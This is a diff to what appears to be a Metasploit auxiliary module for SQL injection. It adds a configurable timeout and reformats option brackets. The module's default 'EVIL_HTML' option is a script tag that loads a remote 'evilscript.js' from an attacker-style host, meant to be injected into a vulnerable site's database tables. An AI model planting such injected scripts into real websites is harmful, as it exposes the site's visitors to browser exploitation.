@@ -28,14 +28,18 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('URI', [ true,  "The path/file to identify backups", '/index.asp']),
-        OptString.new('QUERY', [ true,  "HTTP URI Query", 'p1=v1&p2=v2&p3=v3']),
-        OptString.new('VULN_PAR', [ true,  "Vulnerable parameter name", 'p1']),
-        OptBool.new('TEXT_INT_INJECTION', [ true,  "Perform string injection", false]),
+        OptString.new('URI', [ true,  "The path/file to identify backups", '/index.asp' ]),
+        OptString.new('QUERY', [ true,  "HTTP URI Query", 'p1=v1&p2=v2&p3=v3' ]),
+        OptString.new('VULN_PAR', [ true,  "Vulnerable parameter name", 'p1' ]),
+        OptBool.new('TEXT_INT_INJECTION', [ true,  "Perform string injection", false ]),
         OptBool.new('COMMENTED', [ true,  "Comment end of query", true]),
-        OptString.new('EVIL_HTML', [ true,  "Evil HTML to add to tables", '<script src=http://browser-autopwn.com/evilscript.js></script>']),
+        OptString.new('EVIL_HTML', [ true,  "Evil HTML to add to tables", '<script src=http://browser-autopwn.com/evilscript.js></script>' ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 20 ])
       ], self.class)
+  end
 
+  def timeout
+    datastore['TIMEOUT'] || 20
   end
 
   def run_host(ip)
@@ -83,7 +87,7 @@ EOF
       'vars_get'     =>  gvars,
       'method'       => 'GET',
       'ctype'        => 'text/plain'
-    }, 20)
+    }, timeout)
 
   rescue ::Rex::ConnectionError
   rescue ::Errno::EPIPE
